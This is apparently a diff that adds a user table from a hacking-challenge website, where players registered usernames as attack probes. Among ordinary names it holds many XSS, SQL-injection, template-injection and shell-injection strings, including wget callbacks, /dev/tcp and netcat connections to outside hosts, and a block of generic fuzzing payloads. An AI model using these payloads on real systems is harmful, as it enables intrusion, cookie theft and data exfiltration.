@@ -1,0 +1,491 @@
+id	username
+1	admin
+2	wikileaks
+3	julianassange
+4	darkarmy
+5	test
+6	assange
+7	kek
+8	corb3nik
+9	teddanson
+10	dad
+11	;
+12	imatester
+13	'
+14	ayee
+15	a
+16	ian
+17	e
+18	j
+19	elitest
+20	wgord1
+21	wglfmerl
+22	jkl
+23	<scrip>alert('aa');</script>
+24	deez
+25	testme
+26	t
+27	julianassange_
+28	asfsad
+29	asd
+30	b
+31	bvrvjkpr
+32	vqdyofal
+33	blackbunny
+34	allocriss
+35	hwak
+36	allocriss2
+37	a' union all select load_file('/proc/self/cmdline'),null-- -
+38	hwakheart
+39	f
+40	pit
+41	itszn
+42	user
+43	testaasdfasdfasdfasdf
+44	blah
+45	cats
+46	<img src=http://requestb.in/waqj1uwa>
+47	cats2
+48	cats-1
+49	mopman
+50	cats-1a
+51	cats-1b
+52	admin1
+53	itszn2
+54	test222
+55	tancuibap
+56	adven
+57	adven2
+58	m1dn8
+59	a' union all select @@datadir,null-- -
+60	haha
+61	mlsskjyg
+62	cawtnnax
+63	besthacker
+64	"
+65	dsa
+66	testid\\
+67	testid
+68	xx
+69	'; wget http://requestb.in/s2v9oxs2 #
+70	salam
+71	ayy
+72	ovatbkjp
+73	viamqocr
+74	asdasd
+75	test123
+76	aaaa
+77	demi
+78	aa
+79	ppzc0l1n
+80	z3r0n8
+81	guest
+82	<b>test</b>
+83	adminz
+84	noobs
+85	<script src='http://176.31.186.99/s.js'></script>
+86	zork
+87	captn_nemo
+88	yolo
+89	x
+90	lego1
+91	hqfybfup
+92	shxnkgjl
+93	dia2diab
+94	vtest1
+95	';sleep+10;echo+'aa
+96	foobar
+97	foobar2
+98	wchqqqbe
+99	'';!--"<xss>=&{()}
+100	<script src=http://ha.ckers.org/xss.js></script>
+101	<img src=javascript:alert('xss')>
+102	<img src="javascript:alert('xss');">
+103	<img src=javascrscriptipt:alert('xss')>
+104	<img """><script>alert("xss")</script>">
+105	<script/xss src="http://ha.ckers.org/xss.js"></script>
+106	<img src=" &#14;  javascript:alert('xss');">
+107	<script/src="http://ha.ckers.org/xss.js"></script>
+108	<<script>alert("xss");//<</script>
+109	<script>a=/xss/alert(a.source)</script>
+110	\\";alert('xss');//
+111	</title><script>alert("xss");</script>
+112	<table><td background="javascript:alert('xss')">
+113	<div style="background-image: url(javascript:alert('xss'))">
+114	<div style="width: expression(alert('xss'));">
+115	a' or 1=1--
+116	"a"" or 1=1--"
+117	 or a = a
+118	a' or 'a' = 'a
+119	1 or 1=1
+120	a' waitfor delay '0:0:10'--
+121	1 waitfor delay '0:0:10'--
+122	a'
+123	?
+124	' or 1=1
+125	ý or 1=1 --
+126	x' and userid is null; --
+127	x' and email is null; --
+128	anything' or 'x'='x
+129	x' and 1=(select count(*) from tabname); --
+130	x' and members.email is null; --
+131	x' or full_name like '%bob%
+132	23 or 1=1
+133	'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+134	' or ''='
+135	' or 'x'='x
+136	 or x=x
+137	') or ('x'='x
+138	0 or 1=1
+139	' or 0=0 --
+140	" or 0=0 --
+141	or 0=0 --
+142	' or 0=0 #
+143	 or 0=0 #"
+144	or 0=0 #
+145	' or 1=1--
+146	" or 1=1--
+147	' or '1'='1'--
+148	' or 1 --'
+149	or 1=1--
+150	or 1=1
+151	or 1=1 --
+152	' or 1=1 or ''='
+153	 or 1=1 or ""=
+154	' or a=a--
+155	 or a=a
+156	') or ('a'='a
+157	) or (a=a
+158	hi or a=a
+159	hi or 1=1 --"
+160	hi' or 1=1 --
+161	hi' or 'a'='a
+162	hi') or ('a'='a
+163	"hi"") or (""a""=""a"
+164	'hi' or 'x'='x';
+165	@variable
+166	,@variable
+167	print
+168	print @@variable
+169	select
+170	insert
+171	as
+172	or
+173	procedure
+174	limit
+175	order by
+176	asc
+177	desc
+178	delete
+179	update
+180	distinct
+181	having
+182	truncate
+183	replace
+184	like
+185	handler
+186	bfilename
+187	' or username like '%
+188	' or uname like '%
+189	' or userid like '%
+190	' or uid like '%
+191	' or user like '%
+192	exec xp
+193	exec sp
+194	'; exec master..xp_cmdshell
+195	'; exec xp_regread
+196	t'exec master..xp_cmdshell 'nslookup www.google.com'--
+197	--sp_password
+198	\\x27union select
+199	' union select
+200	' or (exists)
+201	' union all select
+202	' (select top 1
+203	'||utl_http.request
+204	1;select *
+205	to_timestamp_tz
+206	tz_offset
+207	<>"'%;)(&+
+208	 $(sleep 50)
+209	 'sleep 50'
+210	char@39a+@select
+211	&apos; or
+212	'sqlattempt1
+213	(sqlattempt2)
+214	|
+215	*|
+216	*(|(mail=*))
+217	*(|(objectclass=*))
+218	(
+219	)
+220	&
+221	!
+222	x' or 1=1 or 'x'='y
+223	/
+224	//
+225	//*
+226	*/*
+227	a' or 3=3--
+228	"a"" or 3=3--"
+229	' or 3=3
+230	ý or 3=3 --
+231	khhyrjyy
+232	aaaaaaaaaaaaaaaaaaa
+233	auke
+234	blablach
+235	pzyc0
+236	lewisb3"/'>>>>
+237	red
+238	adminadmin
+239	glucose
+240	{{1+1}}
+241	123123
+242	aa1
+243	{{1+1}}{{1+1}}{{1+1}}
+244	joe12
+245	qwertz
+246	<img src=1>
+247	joe18
+248	joe153
+249	choiys
+250	ops
+251	hello123
+252	geoc
+253	wasd
+254	wasd1
+255	123
+256	0x90
+257	pies
+258	yousuck
+259	hello
+260	hej
+261	julian
+262	c
+263	zxczxczxc
+264	xxx
+265	admin                                                 abc
+266	newuser
+267	mongo
+268	qtest
+269	issa
+270	zap
+271	gros
+272	mmmm
+273	8402
+274	tester123
+275	aaaa'
+276	Ã dmin
+277	testidaaaa
+278	voorivex
+279	voorivex2
+280	fofbceqe
+281	wxqooaxs
+282	aze
+283	aaaaaaaa
+284	ripsec
+285	irgeeks3
+286	ripsec2
+287	irgeeks3'
+288	irgeeks3',0)waitfor delay'0:0:20'--
+289	irgeeks396352537' or 4576=4577-- 
+290	irgeeks3' and 1226=1226-- 
+291	irgeeks3|ping -n 20 127.0.0.1||x
+292	hbvimgsg
+293	"svservsrverves
+294	noob
+295	ersou
+296	tt
+297	1
+298	lola
+299	asdfa
+300	irgeeks5
+301	sajjad
+302	aaaaaaa
+303	hogehogh
+304	vic511
+305	vic
+306	cost6
+307	sajjads
+308	ripsec4
+309	cost6_2
+310	ddd
+311	aaatest
+312	''
+313	s
+314	loluser23
+315	dot.
+316	admin1342
+317	admin13472
+318	admin134712
+319	admin134712'
+320	abcabc
+321	b0yd
+322	qweqwe
+323	q
+324	b0yd2
+325	admin2
+326	loluser24
+327	pepe
+328	jorgue
+329	bobbyhill
+330	ripsec5
+331	hankhill
+332	pepe123
+333	peggyhill
+334	pepe1234
+335	useuse
+336	billdotree
+337	theirneighbor
+338	aaa
+339	culo
+340	c43s4r
+341	x' or 'x'='x
+342	112233
+343	peacemaker
+344	hops
+345	harambae
+346	john
+347	bluqueef
+348	frankbean
+349	bobby
+350	dade
+351	temp
+352	tester
+353	glucose2
+354	asdf
+355	fapfap`
+356	fapfap2
+357	fapfap3
+358	blahy
+359	qwe
+360	smith
+361	hgregal
+362	\\
+363	iangcarroll
+364	testtesttest
+365	igc1
+366	foo
+367	test1120
+368	test1121
+369	testuser
+370	adm1nkyj
+371	eatadik
+372	eatadik2
+373	qqqq
+374	xx1
+375	neegan
+376	aajak
+377	mmzuku
+378	dupa
+379	dragonsector
+380	nilch
+381	aldo_k
+382	blendin
+383	fghhttvx
+384	qngugrtl
+385	test2
+386	fpltnttk
+387	1234
+388	lmowfvnq
+389	<hr>
+390	test1
+391	'; wget http://requestb.in/s9rxxfs9 #
+392	'; wget 'http://requestb.in/s9rxxfs9?x=a' #
+393	'; wget http://requestb.in/1fpgw081 #
+394	ddf
+395	abc&
+396	132123123123123
+397	sebyza
+398	krwawobrody
+399	vik0nd
+400	asdas<img src="http://requestb.in/1n7t95g1">
+401	<img src="http://requestb.in/1n7t95g1">
+402	qweppp
+403	asdlll
+404	meowmeow
+405	trest
+406	testid1
+407	wtf
+408	usertest
+409	fucker
+410	wizards1
+411	wizard2
+412	<script>alert('fuck')</script>
+413	<script>alert('fuck2')</script>
+414	k
+415	john2342
+416	injectyy
+417	;asuh;saoehf;io
+418	wat
+419	test >dev/null; echo "wat" > /dev/tcp/f0rki.at/4444; echo "wat"
+420	test >dev/null; echo "wat" | nc f0rki.at 4444; echo "wat"
+421	yologalore
+422	pwngalore
+423	watwatwat
+424	133713pwnies
+425	pwnies
+426	mhackgyver
+427	<script>alert('aa');</script>
+428	juliÃ nassange
+429	a<i>
+430	gh5ewrsg3w4v
+431	12345
+432	raku
+433	black1
+434	bigmacjoe
+435	aaaaa
+436	t94j0
+437	test'
+438	julianasange
+439	ttt
+440	ccc
+441	vtest3
+442	webzy
+443	n
+444	naps
+445	hotab
+446	hotab2
+447	sayfrbme
+448	ruytbail
+449	xxrootxx
+450	corb3nik_test
+451	vtest4
+452	gay
+453	<script>(alert cookie.txt)</script>
+454	sdfsdf
+455	<script>alert(document.cookie)</script>
+456	sean
+457	avramescu
+458	vik0nd123
+459	thedonald
+460	pwnies4life
+461	itswill
+462	asdplm
+463	vtest6
+464	asdpml2
+465	asdtenplm
+466	bogdan
+467	chuj
+468	zzz
+469	wsrskrgs
+470	root
+471	killer
+472	txoyolie
+473	adami
+474	admin                                                 x
+475	admin                                                          x
+476	yoyo
+477	testfo
+478	bobthehacker
+479	hh1234567890
+480	dev/null 
+481	aaaaa1
+482	blabla<img src=a>
+483	p1
+484	joe
+485	xnxx
+486	headerenrichment
+487	headerenrichment2
+488	cambridge2
+489	ddog
+490	opentoall
